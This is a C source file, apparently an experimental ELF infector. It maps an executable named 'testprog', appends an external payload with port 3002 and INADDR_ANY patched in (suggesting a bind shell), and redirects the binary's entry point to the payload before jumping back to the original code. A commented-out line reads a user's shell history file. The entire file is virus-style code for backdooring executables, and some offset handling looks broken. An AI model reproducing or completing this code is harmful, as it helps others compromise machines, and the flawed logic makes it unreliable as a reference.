#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <arpa/inet.h>

extern void _payload(void);
extern uint64_t _payload_size;

uint16_t port = 0;
uint32_t addr_ip = 0;

int main()
{
	port = htons(3002);
	addr_ip = htonl(INADDR_ANY);
	printf("port: %#x %#x\n", port, addr_ip);

	// int fd = open("/home/mgama/.zsh_history", O_RDONLY);
	int fd = open("testprog", O_RDWR);
	if (fd < 0) {
		perror("open");
		return 1;
	}

	size_t payload_size = 1500;
	// void *payload = malloc(payload_size);
	// if (payload == NULL) {
	// 	perror("malloc");
	// 	return 1;
	// }
	// memcpy(payload, _payload, payload_size);

	size_t size = lseek(fd, 0, SEEK_END);
	void *data = mmap(NULL, size + payload_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (data == MAP_FAILED) {
		perror("mmap");
		return 1;
	}

	printf("data: %p\n", data);

	// data = syscall(SYS_mremap, data, size, size + payload_size, 1);
    // if (data == MAP_FAILED) {
    //     perror("mremap");
    //     return 1;
    // }

	uint32_t entry_point_offset = 0x18;
	uint64_t entry_point = *(uint64_t *)(data + entry_point_offset);

	printf("end of data: %x\n", data + size);

	printf("entry point: %#lx\n", *(uint64_t *)(data + size - 8));

	printf("size: %p, %p, %p\n", data, size, data + size);
	memcpy(data + size, &_payload, payload_size);
	memcpy(data + size + payload_size - 4 - 2, &port, 2);
	memcpy(data + size + payload_size - 4, &addr_ip, 4);

	// set new entry point
	memcpy(data + entry_point_offset, data + size, 4);

	// set jump to original entry point
	uint64_t jump = entry_point - (size + 4);
	memcpy(data + size + payload_size - 4 - 2 - 8, &jump, 4);

	printf("jump: %#p\n", data);
	write(1, data, size + payload_size);
	close(fd);

	munmap(data, size + payload_size);

	return 0;
}
